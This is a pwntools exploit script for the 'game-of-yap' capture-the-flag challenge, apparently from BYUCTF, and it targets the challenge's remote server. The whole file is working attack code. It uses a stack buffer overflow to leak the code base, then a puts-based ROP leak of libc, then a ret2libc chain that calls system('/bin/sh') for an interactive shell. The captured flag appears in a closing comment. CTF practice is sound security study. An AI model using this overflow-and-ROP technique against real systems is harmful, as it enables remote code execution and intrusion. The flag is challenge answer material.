from pwn import *

exe = ELF("./game-of-yap_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p_s = lambda data: p.send(data)
p_sa = lambda msg, data: p.sendafter(msg, data)
p_sl = lambda data: p.sendline(data)
p_sla = lambda msg, data: p.sendlineafter(msg, data)
p_recvut = lambda msg: p.recvuntil(msg)
debug = lambda : gdb.attach(p, gdbscript = script)

'''
read
'''

script = '''
b *main
brva 0x1233
'''

p = remote("yap.chal.cyberjousting.com", 1355)
#p = gdb.debug("./game-of-yap_patched", gdbscript = script)

payload = b"A" * 0x100
payload += p64(0) + p8(0x80)
p.sendafter(b"chance...\n", payload)

code_base = int(p.recvline(), 16) - exe.symbols['play']
print(hex(code_base))

yap = code_base + 0x1280
mov_rdi_rsi = code_base + 0x0000000000001243
puts_plt = code_base + exe.plt['puts']
play = code_base + exe.symbols['play'] + 5
flush_buf = code_base + exe.symbols['flush_buf'] + 48
nothing = code_base + 0x1247
puts_got = code_base + exe.got['puts']

payload = b"A" * 0x100
payload += p64(0) + p64(mov_rdi_rsi)
payload += p64(puts_plt) + p64(play)
p.sendafter(b"try...", payload)
p.recvuntil(b"A" * 0x48)
libc_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x93965
print(hex(libc_base))

system = libc_base + libc.symbols['system']
binsh = libc_base + list(libc.search(b"/bin/sh\x00"))[0]
pop_rdi = libc_base + 0x000000000010f75b
ret = pop_rdi + 1

payload = b"A" * 0x100
payload += p64(0) + p64(pop_rdi)
payload += p64(binsh) + p64(ret)
payload += p64(system)
p.send(payload)

p.interactive()
#byuctf{heres_your_yap_plus_certification_c13abe01}
